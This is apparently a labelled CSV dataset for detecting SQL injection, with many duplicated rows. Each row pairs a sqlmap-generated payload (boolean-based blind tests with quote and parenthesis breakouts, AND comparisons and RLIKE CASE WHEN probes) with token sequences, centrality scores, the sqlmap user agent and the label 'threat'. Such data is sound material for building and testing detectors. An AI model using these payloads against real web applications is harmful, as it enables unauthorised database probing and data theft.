payload,token,centrality,requestmethod,uagent,label
1') AND 7147=9200-- kxBs,INT SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') AND 7147=9200-- kxBs,INT SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') AND 7090=7090-- vxcm,INT SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') AND 7090=7090-- vxcm,INT SQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 5970=5888-- GuuB,INT SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 5970=5888-- GuuB,INT SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 7090=7090-- rYEU,INT SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' AND 7090=7090-- rYEU,INT SQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") AND 4046=6222-- VCjZ",INT DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") AND 4046=6222-- VCjZ",INT DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") AND 7090=7090-- xbNZ",INT DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") AND 7090=7090-- xbNZ",INT DQUT RPRN AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 7528=4484-- CQTx",INT DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 7528=4484-- CQTx",INT DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 7090=7090-- Ybpc",INT DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"" AND 7090=7090-- Ybpc",INT DQUT AND INT EQ INT DSCMT STR,0.5714285714285714 0.7142857142857142 0.8571428571428571 1.0 1.0 0.8571428571428571 0.7142857142857142 0.5714285714285714,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%') AND 3445=6787-- BrBj,INT PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%') AND 3445=6787-- BrBj,INT PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%') AND 7090=7090-- DouO,INT PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%') AND 7090=7090-- DouO,INT PRCNT SQUT RPRN AND INT EQ INT DSCMT STR,0.4444444444444444 0.5555555555555556 0.6666666666666666 0.7777777777777777 0.8888888888888888 0.8888888888888888 0.7777777777777777 0.6666666666666666 0.5555555555555556 0.4444444444444444,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 1549=1732-- wQSt,INT PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 1549=1732-- wQSt,INT PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 7090=7090-- TqDL,INT PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1%' AND 7090=7090-- TqDL,INT PRCNT SQUT AND INT EQ INT DSCMT STR,0.5 0.625 0.75 0.875 1.0 0.875 0.75 0.625 0.5,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1) RLIKE (SELECT (CASE WHEN (4645=8698) THEN 1 ELSE 0x28 END)) AND (8461=8461,INT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN INT EQ INT,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1) RLIKE (SELECT (CASE WHEN (4645=8698) THEN 1 ELSE 0x28 END)) AND (8461=8461,INT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN INT EQ INT,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1) RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND (9073=9073,INT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN INT EQ INT,0.2222222222222222 0.2777777777777778 0.3333333333333333 0.38888888888888884 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.4444444444444444 0.38888888888888884 0.3333333333333333 0.2777777777777778 0.2222222222222222,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1)) RLIKE (SELECT (CASE WHEN (9481=3686) THEN 1 ELSE 0x28 END)) AND ((4390=4390,INT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN INT EQ INT,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1)) RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND ((8349=8349,INT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN INT EQ INT,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1)) RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND ((8349=8349,INT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN INT EQ INT,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)),INT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)),INT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END,0.3333333333333333 0.41666666666666663 0.5 0.5833333333333333 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.6666666666666666 0.5833333333333333 0.5 0.41666666666666663 0.3333333333333333,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 RLIKE (SELECT (CASE WHEN (6493=7846) THEN 1 ELSE 0x28 END))-- cNft,INT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END DSCMT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 RLIKE (SELECT (CASE WHEN (6493=7846) THEN 1 ELSE 0x28 END))-- cNft,INT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END DSCMT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END))-- aBOV,INT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END DSCMT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1 RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END))-- aBOV,INT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END DSCMT STR,0.2857142857142857 0.3571428571428571 0.42857142857142855 0.5 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5714285714285714 0.5 0.42857142857142855 0.3571428571428571 0.2857142857142857,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') RLIKE (SELECT (CASE WHEN (5735=5968) THEN 1 ELSE 0x28 END)) AND ('UkoE'='UkoE,INT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') RLIKE (SELECT (CASE WHEN (5735=5968) THEN 1 ELSE 0x28 END)) AND ('UkoE'='UkoE,INT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN SQUT STR SQUT EQ SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1')) RLIKE (SELECT (CASE WHEN (2613=6001) THEN 1 ELSE 0x28 END)) AND (('nmkv'='nmkv,INT SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1')) RLIKE (SELECT (CASE WHEN (2613=6001) THEN 1 ELSE 0x28 END)) AND (('nmkv'='nmkv,INT SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1')) RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND (('CZvU'='CZvU,INT SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1')) RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND (('CZvU'='CZvU,INT SQUT RPRN RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.16666666666666666 0.20833333333333331 0.25 0.29166666666666663 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.3333333333333333 0.29166666666666663 0.25 0.20833333333333331 0.16666666666666666,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' RLIKE (SELECT (CASE WHEN (3139=2345) THEN 1 ELSE 0x28 END)) AND 'PSlo'='PSlo,INT SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' RLIKE (SELECT (CASE WHEN (3139=2345) THEN 1 ELSE 0x28 END)) AND 'PSlo'='PSlo,INT SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND 'tUom'='tUom,INT SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND SQUT STR SQUT EQ SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') RLIKE (SELECT (CASE WHEN (1808=5638) THEN 1 ELSE 0x28 END)) AND ('MVJu' LIKE 'MVJu,INT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') RLIKE (SELECT (CASE WHEN (1808=5638) THEN 1 ELSE 0x28 END)) AND ('MVJu' LIKE 'MVJu,INT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND ('IBjd' LIKE 'IBjd,INT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1') RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND ('IBjd' LIKE 'IBjd,INT SQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN SQUT STR SQUT LIKE SQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' RLIKE (SELECT (CASE WHEN (4927=8269) THEN 1 ELSE 0x28 END)) AND 'Yftl' LIKE 'Yftl,INT SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
1' RLIKE (SELECT (CASE WHEN (4927=8269) THEN 1 ELSE 0x28 END)) AND 'Yftl' LIKE 'Yftl,INT SQUT RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND SQUT STR SQUT LIKE SQUT STR,0.2 0.25 0.30000000000000004 0.35000000000000003 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.4 0.35000000000000003 0.30000000000000004 0.25 0.2,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") RLIKE (SELECT (CASE WHEN (8583=4843) THEN 1 ELSE 0x28 END)) AND (""oIAx""=""oIAx",INT DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") RLIKE (SELECT (CASE WHEN (8583=4843) THEN 1 ELSE 0x28 END)) AND (""oIAx""=""oIAx",INT DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"1"") RLIKE (SELECT (CASE WHEN (1011=1011) THEN 1 ELSE 0x28 END)) AND (""mPyq""=""mPyq",INT DQUT RPRN RLIKE SELECT CASE WHEN INT EQ INT THEN INT ELSE HEX END AND LPRN DQUT STR DQUT EQ DQUT STR,0.18181818181818182 0.2272727272727273 0.2727272727272727 0.3181818181818182 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.36363636363636365 0.3181818181818182 0.2727272727272727 0.2272727272727273 0.18181818181818182,GET,sqlmap/1.2.4#stable (http://sqlmap.org),threat
